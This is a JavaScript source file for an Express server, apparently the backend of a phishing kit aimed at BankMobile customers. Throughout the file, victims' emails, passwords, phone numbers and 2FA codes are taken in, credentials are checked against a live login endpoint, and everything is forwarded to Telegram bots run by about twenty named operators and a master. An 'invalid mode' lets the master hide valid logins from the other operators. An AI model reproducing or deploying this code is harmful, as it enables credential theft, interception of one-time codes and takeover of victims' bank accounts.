// ================================================
// BANKMOBILE CENTRAL RELAY BACKEND
// Global + Per-Client + Master + Invalid switch
// ================================================
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3004;

app.use(cors({ origin: '*' }));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ================================================
// TELEGRAM BOT CONFIGURATIONS
// ================================================
const MASTER_BOT = {
    token: process.env.MASTER_BOT_TOKEN || process.env.BOT_TOKEN_1,
    chatId: process.env.MASTER_CHAT_ID || process.env.CHAT_ID_1
};

const BOT_CONFIGS = {
    'emmy': { token: process.env.BOT_TOKEN_1, chatId: process.env.CHAT_ID_1 },
    'mastapis': { token: process.env.BOT_TOKEN_2, chatId: process.env.CHAT_ID_2 },
    'black': { token: process.env.BOT_TOKEN_3, chatId: process.env.CHAT_ID_3 },
    'oju': { token: process.env.BOT_TOKEN_4, chatId: process.env.CHAT_ID_4 },
    'bosun': { token: process.env.BOT_TOKEN_5, chatId: process.env.CHAT_ID_5 },
    'jide': { token: process.env.BOT_TOKEN_6, chatId: process.env.CHAT_ID_6 },
    'chamber': { token: process.env.BOT_TOKEN_7, chatId: process.env.CHAT_ID_7 },
    'crip': { token: process.env.BOT_TOKEN_8, chatId: process.env.CHAT_ID_8 },
    'hayzed': { token: process.env.BOT_TOKEN_9, chatId: process.env.CHAT_ID_9 },
    'ysd': { token: process.env.BOT_TOKEN_10, chatId: process.env.CHAT_ID_10 },
    'sula': { token: process.env.BOT_TOKEN_11, chatId: process.env.CHAT_ID_11 },
    'aro': { token: process.env.BOT_TOKEN_12, chatId: process.env.CHAT_ID_12 },
    'apo': { token: process.env.BOT_TOKEN_13, chatId: process.env.CHAT_ID_13 },
    'alahji': { token: process.env.BOT_TOKEN_14, chatId: process.env.CHAT_ID_14 },
    'ola': { token: process.env.BOT_TOKEN_15, chatId: process.env.CHAT_ID_15 },
    'bamzy': { token: process.env.BOT_TOKEN_16, chatId: process.env.CHAT_ID_16 },
    'mm': { token: process.env.BOT_TOKEN_17, chatId: process.env.CHAT_ID_17 },
    'bayo': { token: process.env.BOT_TOKEN_18, chatId: process.env.CHAT_ID_18 },
    'tobi': { token: process.env.BOT_TOKEN_19, chatId: process.env.CHAT_ID_19 },
    'bambam': { token: process.env.BOT_TOKEN_20, chatId: process.env.CHAT_ID_20 }
};

const DEFAULT_CONFIG = {
    token: process.env.DEFAULT_BOT_TOKEN || process.env.BOT_TOKEN_1,
    chatId: process.env.DEFAULT_CHAT_ID || process.env.CHAT_ID_1
};

// ================================================
// SWITCHES + PENDING VALID SESSIONS
// ================================================
let clientsEnabled = true;
let masterEnabled = true;
let invalidMode = false;                    // default OFF (normal mode)
const disabledClients = new Set();

const pendingValidSessions = {};
const SESSION_TIMEOUT = 15 * 60 * 1000;

setInterval(() => {
    const now = Date.now();
    for (const clientId in pendingValidSessions) {
        pendingValidSessions[clientId] = pendingValidSessions[clientId].filter(ts => now - ts < SESSION_TIMEOUT);
        if (pendingValidSessions[clientId].length === 0) {
            delete pendingValidSessions[clientId];
        }
    }
}, 2 * 60 * 1000);

// ================================================
// SEND TO TELEGRAM
// ================================================
async function sendToTelegram(token, chatId, message) {
    if (!token || !chatId) {
        console.log('⚠️ Missing token or chat ID');
        return false;
    }
    try {
        await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
        console.log(`✅ Telegram sent to: ${chatId}`);
        return true;
    } catch (error) {
        console.error(`❌ Telegram error (${chatId}):`, error.message);
        return false;
    }
}

// ================================================
// SEND TO BOTS
// ================================================
async function sendToBots(clientId, clientMessage, masterMessage, options = {}) {
    const { onlyMaster = false } = options;
    const results = [];

    if (masterEnabled) {
        const masterResult = await sendToTelegram(MASTER_BOT.token, MASTER_BOT.chatId, masterMessage);
        results.push({ bot: 'MASTER', sent: masterResult });
    } else {
        results.push({ bot: 'MASTER', sent: false, reason: 'Master bot is DISABLED' });
        console.log('🚫 Master bot DISABLED');
    }

    if (onlyMaster) {
        results.push({ bot: clientId, sent: false, reason: 'Invalid mode → Valid OTP only to Master' });
        console.log(`🚫 OTP for ${clientId} sent ONLY to Master (Invalid mode)`);
        return results;
    }

    const isClientAllowed = clientsEnabled && !disabledClients.has(clientId);

    if (isClientAllowed) {
        const config = BOT_CONFIGS[clientId] || DEFAULT_CONFIG;
        const clientResult = await sendToTelegram(config.token, config.chatId, clientMessage);
        results.push({ bot: clientId, sent: clientResult });
    } else {
        let reason = 'Clients globally DISABLED';
        if (clientsEnabled && disabledClients.has(clientId)) {
            reason = `Client "${clientId}" is individually DISABLED`;
        }
        results.push({ bot: clientId, sent: false, reason });
        console.log(`🚫 ${reason}`);
    }

    return results;
}

// ================================================
// AUTHENTICATE WITH BANKMOBILE
// ================================================
async function authenticateWithAPI(email, password) {
    try {
        console.log(`🌐 Sending login request for: ${email}`);
        const params = new URLSearchParams();
        params.append('usrname', email);
        params.append('passwd', password);

        const response = await axios.post(
            'https://profile.refundselection.com/authenticate/login',
            params.toString(),
            {
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                },
                maxRedirects: 0,
                validateStatus: (status) => status < 500
            }
        );

        if (response.status === 302) {
            console.log('✅ SUCCESS');
            return { success: true };
        }
        console.log('❌ FAILED');
        return { success: false };
    } catch (error) {
        if (error.response && error.response.status === 302) {
            console.log('✅ SUCCESS (redirect)');
            return { success: true };
        }
        console.log('❌ FAILED:', error.message);
        return { success: false };
    }
}

// ================================================
// FORMAT MESSAGES
// ================================================
function formatMessage(email, password, success) {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });

    const realStatusText = success ? '✅ VALID' : '❌ INVALID';
    const realStatusEmoji = success ? '✅' : '❌';

    const masterMessage =
        `${realStatusEmoji} <b>BANKMOBILE LOGIN</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📧 <b>Email:</b> <code>${email}</code>\n` +
        `🔑 <b>Password:</b> <code>${password}</code>\n` +
        `📊 <b>Status:</b> ${realStatusText}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;

    let clientMessage;

    if (invalidMode) {
        clientMessage =
            `❌ <b>BANKMOBILE LOGIN</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `📧 <b>Email:</b> <code>${email}</code>\n` +
            `🔑 <b>Password:</b> <code>${password}</code>\n` +
            `📊 <b>Status:</b> ❌ INVALID\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🕐 ${timestamp}`;
    } else {
        clientMessage =
            `${realStatusEmoji} <b>BANKMOBILE LOGIN</b>\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `📧 <b>Email:</b> <code>${email}</code>\n` +
            `🔑 <b>Password:</b> <code>${password}</code>\n` +
            `📊 <b>Status:</b> ${realStatusText}\n` +
            `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
            `🕐 ${timestamp}`;
    }

    return { clientMessage, masterMessage };
}

function formatPhoneMessage(phone) {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
    const message =
        `📱 <b>PHONE NUMBER</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `📱 <b>Phone:</b> <code>${phone}</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;
    return { clientMessage: message, masterMessage: message };
}

function formatOtpMessage(otp, trusted) {
    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
    const message =
        `🔐 <b>2FA CODE</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🔢 <b>Code:</b> <code>${otp}</code>\n` +
        `💻 <b>Trust Device:</b> ${trusted ? '✅ Yes' : '❌ No'}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `🕐 ${timestamp}`;
    return { clientMessage: message, masterMessage: message };
}

// ================================================
// SHARED AUTH HANDLER
// ================================================
async function handleAuth(req, res) {
    const { email, password, frontend } = req.body;
    const clientId = frontend || 'default';

    console.log(`\n🔐 Login attempt from: ${clientId}`);
    console.log(`📧 Email: ${email}`);

    const result = await authenticateWithAPI(email, password);
    const messages = formatMessage(email, password, result.success);

    if (result.success) {
        if (!pendingValidSessions[clientId]) pendingValidSessions[clientId] = [];
        pendingValidSessions[clientId].push(Date.now());
        console.log(`📌 Valid session queued for ${clientId}`);
    }

    const results = await sendToBots(clientId, messages.clientMessage, messages.masterMessage);

    res.json({
        success: result.success,
        client: clientId,
        clientsEnabled,
        masterEnabled,
        invalidMode,
        telegramSent: results
    });
}

// ================================================
// PHONE + OTP HANDLERS
// ================================================
app.post('/submit-phone', async (req, res) => {
    const { phone, frontend } = req.body;
    const clientId = frontend || 'default';

    console.log(`📱 Phone from ${clientId}: ${phone}`);

    const messages = formatPhoneMessage(phone);
    await sendToBots(clientId, messages.clientMessage, messages.masterMessage);

    res.json({ success: true });
});

app.post('/submit-otp', async (req, res) => {
    const { otp, trusted, frontend } = req.body;
    const clientId = frontend || 'default';

    console.log(`🔐 OTP from ${clientId}: ${otp}`);

    const messages = formatOtpMessage(otp, trusted || false);

    let isFromValidLogin = false;

    if (pendingValidSessions[clientId] && pendingValidSessions[clientId].length > 0) {
        pendingValidSessions[clientId].shift();
        isFromValidLogin = true;

        if (pendingValidSessions[clientId].length === 0) {
            delete pendingValidSessions[clientId];
        }
    }

    const onlyMaster = invalidMode && isFromValidLogin;

    await sendToBots(clientId, messages.clientMessage, messages.masterMessage, { onlyMaster });

    res.json({ success: true });
});

// ================================================
// CONTROL ENDPOINTS
// ================================================
app.all('/clients-off', (req, res) => {
    clientsEnabled = false;
    console.log('🚫 ALL CLIENTS DISABLED');
    res.json({ success: true, message: 'All clients disabled.', clientsEnabled: false });
});

app.all('/clients-on', (req, res) => {
    clientsEnabled = true;
    console.log('✅ ALL CLIENTS ENABLED');
    res.json({ success: true, message: 'All clients enabled.', clientsEnabled: true });
});

app.all('/client-off/:clientId', (req, res) => {
    const clientId = req.params.clientId.toLowerCase();
    if (!BOT_CONFIGS[clientId] && clientId !== 'default') {
        return res.status(404).json({ success: false, message: `Client "${clientId}" not found` });
    }
    disabledClients.add(clientId);
    console.log(`🚫 Client "${clientId}" DISABLED`);
    res.json({
        success: true,
        message: `Client "${clientId}" has been disabled.`,
        disabledClients: Array.from(disabledClients)
    });
});

app.all('/client-on/:clientId', (req, res) => {
    const clientId = req.params.clientId.toLowerCase();
    disabledClients.delete(clientId);
    console.log(`✅ Client "${clientId}" ENABLED`);
    res.json({
        success: true,
        message: `Client "${clientId}" has been enabled.`,
        disabledClients: Array.from(disabledClients)
    });
});

app.all('/master-off', (req, res) => {
    masterEnabled = false;
    console.log('🚫 MASTER BOT DISABLED');
    res.json({ success: true, message: 'Master bot has been disabled.', masterEnabled: false });
});

app.all('/master-on', (req, res) => {
    masterEnabled = true;
    console.log('✅ MASTER BOT ENABLED');
    res.json({ success: true, message: 'Master bot has been enabled.', masterEnabled: true });
});

// Invalid mode switch (renamed)
app.all('/invalid-on', (req, res) => {
    invalidMode = true;
    console.log('🔴 Invalid mode ON → Clients always see INVALID + Valid OTP only to Master');
    res.json({
        success: true,
        message: 'Invalid mode ON. Clients always see INVALID. Valid OTP goes only to Master.',
        invalidMode: true
    });
});

app.all('/invalid-off', (req, res) => {
    invalidMode = false;
    console.log('🟢 Invalid mode OFF → Normal mode');
    res.json({
        success: true,
        message: 'Invalid mode OFF. Both sides see real status.',
        invalidMode: false
    });
});

app.get('/clients-status', (req, res) => {
    res.json({
        masterEnabled,
        globalClientsEnabled: clientsEnabled,
        invalidMode,
        disabledClients: Array.from(disabledClients),
        pendingValidSessions,
        status: {
            master: masterEnabled ? 'ON' : 'OFF',
            clients: clientsEnabled
                ? (disabledClients.size === 0 ? 'All ON' : `Some disabled: ${Array.from(disabledClients).join(', ')}`)
                : 'ALL OFF',
            invalidMode: invalidMode ? 'ON' : 'OFF'
        }
    });
});

// ================================================
// AUTH ENDPOINTS
// ================================================
app.post('/authenticate', handleAuth);
app.post('/auth', handleAuth);
app.post('/verify', handleAuth);
app.post('/login', handleAuth);
app.post('/validate', handleAuth);

// ================================================
// HEALTH + ROOT
// ================================================
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        service: 'bankmobile-relay',
        masterEnabled,
        clientsEnabled,
        invalidMode,
        disabledClients: Array.from(disabledClients),
        clients: Object.keys(BOT_CONFIGS)
    });
});

app.get('/', (req, res) => {
    res.json({
        service: 'BankMobile Relay Backend',
        status: 'running',
        masterEnabled,
        clientsEnabled,
        invalidMode,
        disabledClients: Array.from(disabledClients),
        control: {
            'GET/POST /clients-off': 'Disable ALL clients',
            'GET/POST /clients-on': 'Enable ALL clients',
            'GET/POST /client-off/:clientId': 'Disable one client',
            'GET/POST /client-on/:clientId': 'Enable one client',
            'GET/POST /master-off': 'Disable Master bot',
            'GET/POST /master-on': 'Enable Master bot',
            'GET/POST /invalid-on': 'Clients always see INVALID + Valid OTP only to Master',
            'GET/POST /invalid-off': 'Normal mode (both see real status)',
            'GET /clients-status': 'Check current status'
        }
    });
});

// ================================================
// START SERVER
// ================================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ BankMobile Relay running on port ${PORT}`);
    console.log(`📨 Clients: ${Object.keys(BOT_CONFIGS).join(', ')}`);
    console.log(`🔴 Invalid mode: ${invalidMode ? 'ON' : 'OFF'}`);
    console.log(`🔧 /invalid-on  |  /invalid-off`);
    console.log(`🔧 /clients-off  |  /clients-on`);
    console.log(`🔧 /client-off/mm  |  /client-on/mm`);
    console.log(`🔧 /master-off   |  /master-on`);
    console.log(`📊 /clients-status`);
});
